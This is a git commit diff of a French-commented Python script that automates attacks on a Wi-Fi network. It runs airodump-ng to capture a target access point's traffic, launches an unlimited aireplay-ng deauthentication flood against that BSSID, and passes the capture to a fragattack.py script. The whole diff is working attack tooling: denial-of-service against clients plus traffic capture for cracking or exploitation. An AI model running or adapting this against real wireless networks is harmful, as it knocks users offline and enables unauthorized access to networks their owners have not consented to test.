fd21341f62d61b8b259bd5130bef56f0dcac8458
kali973 <gilles.coutard@outlook.fr>
2023-06-11 12:21:36 +0200

    initialisation projet

--- services/retrieveMac.py
+++ services/retrieveMac.py
@@ -6,31 +6,68 @@ from multiprocessing import Process
 
 def lancer_airodump_ng(channel, bssid):
     command_airodump = ['x-terminal-emulator', '-e', 'airodump-ng', 'wlan0', '-w', 'captureDatagramme', '-c', channel, '--bssid', bssid]
-    subprocess.Popen(command_airodump)
+    print("Commande airodump_ng :", " ".join(command_airodump))
+    subprocess.call(command_airodump)
 
 def lancer_aireplay_ng(bssid):
     command_aireplay = ['x-terminal-emulator', '-e', 'aireplay-ng', '-deauth', '0', '-a', bssid, 'wlan0']
-    subprocess.Popen(command_aireplay)
+    print("Commande aireplay-ng :", " ".join(command_aireplay))
+    subprocess.call(command_aireplay)
 
 def verifier_fichier_capture():
-    while True:
-        file_list = os.listdir('.')
-        for file_name in file_list:
-            if file_name.startswith('captureDatagramme-'):
-                os.remove(file_name)
-                print(f"Le fichier {file_name} a été supprimé.")
-        if not any(file_name.startswith('captureDatagramme-') for file_name in file_list):
-            break
+    file_list = ['captureDatagramme-01.csv', 'captureDatagramme-01.kismet.csv',
+                 'captureDatagramme-01.kismet.netxml',
+                 'captureDatagramme-01.log.csv']
+    for file_name in file_list:
+        if os.path.exists(file_name):
+            os.remove(file_name)
+def verifier_fichier_capture_all():
+    file_list = ['captureDatagramme-01.cap', 'captureDatagramme-01.csv', 'captureDatagramme-01.kismet.csv',
+                 'captureDatagramme-01.kismet.netxml',
+                 'captureDatagramme-01.log.csv']
+    for file_name in file_list:
+        if os.path.exists(file_name):
+            os.remove(file_name)
+
+def lancer_wireshark_capture():
+    command_wireshark = ['wireshark', 'captureDatagramme-01.cap']
+    subprocess.Popen(command_wireshark)
+
+def lancer_fragattack():
+    n = 1  # Nombre de niveaux à remonter à partir du répertoire courant
+    current_directory = os.getcwd()
+    parent_directory = current_directory
+    for _ in range(n):
+        parent_directory = os.path.dirname(parent_directory)
+    for root, dirs, files in os.walk(parent_directory):
+        if 'services' in dirs:
+            fileWireshark_dir = os.path.join(root, 'services')
+            build_sh_path = os.path.join(fileWireshark_dir, 'captureDatagramme-01.cap')
+            if os.path.isfile(build_sh_path):
+                print(f"Fichier captureDatagramme-01.cap trouvé dans {fileWireshark_dir}")
+                break
+
+    n = 1  # Nombre de niveaux à remonter à partir du répertoire courant
+    current_directory = os.getcwd()
+    parent_directory = current_directory
+    for _ in range(n):
+        parent_directory = os.path.dirname(parent_directory)
+    for root, dirs, files in os.walk(parent_directory):
+        if 'research' in dirs:
+            research_dir = os.path.join(root, 'research')
+            build_sh_path = os.path.join(research_dir, 'fragattack.py')
+            if os.path.isfile(build_sh_path):
+                print(f"Exécution de fragattack dans {research_dir}")
+                os.chdir(research_dir)
+                command_fragattack = ['python', 'fragattack.py', fileWireshark_dir+'/captureDatagramme-01.cap']
+                print("Commande fragattack :", " ".join(command_fragattack))
+                subprocess.Popen(command_fragattack)
+                break
 
 # Vérification de l'existence de la base de données
 db_file = 'database.json'
 
-file_list = ['captureDatagramme-01.cap', 'captureDatagramme-01.csv', 'captureDatagramme-01.kismet.csv',
-             'captureDatagramme-01.kismet.netxml',
-             'captureDatagramme-01.log.csv']
-for file_name in file_list:
-    if os.path.exists(file_name):
-        os.remove(file_name)
+verifier_fichier_capture_all()
 
 if os.path.exists(db_file):
     os.remove(db_file)
@@ -107,10 +144,14 @@ if results:
     # Lancement des commandes en parallèle
     process_airodump = Process(target=lancer_airodump_ng, args=(channel, bssid))
     process_aireplay = Process(target=lancer_aireplay_ng, args=(bssid,))
+    process_wireshark = Process(target=lancer_wireshark_capture)
+    process_fragattack = Process(target=lancer_fragattack)
 
     # Démarrage des processus
     process_airodump.start()
     process_aireplay.start()
+    process_wireshark.start()
+    process_fragattack.start()
 
     # Lancement du processus pour vérifier la création du fichier
     process_verifier_capture = Process(target=verifier_fichier_capture)
@@ -119,6 +160,8 @@ if results:
     # Attendre que les processus se terminent
     process_airodump.join()
     process_aireplay.join()
+    process_wireshark.join()
+    process_fragattack.join()
     process_verifier_capture.join()
 else:
     print("Aucune donnée correspondante pour le numéro de séquence saisi.")
